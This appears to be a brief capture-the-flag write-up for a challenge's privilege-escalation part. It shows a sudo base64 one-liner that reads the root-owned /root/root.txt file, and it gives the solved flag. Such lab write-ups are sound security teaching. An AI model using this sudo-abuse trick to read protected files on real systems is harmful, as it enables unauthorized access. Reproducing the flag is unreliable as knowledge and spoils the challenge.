
Congrats on solving the Part 1, this part is the privilege escalation of the SSH instance you compromised on the Part 1

Log in to the service using ssh with same credentials as part 1

![[Pasted image 20240811045237.png]]

use the following cmd

```shell
sudo /usr/bin/base64 /root/root.txt | base64 -d
```

![[Pasted image 20240811045256.png]]

The flag is `KPMG_CTF{Sql1_eXi5t5_iN_tH1S_Ch4l1eNgE}`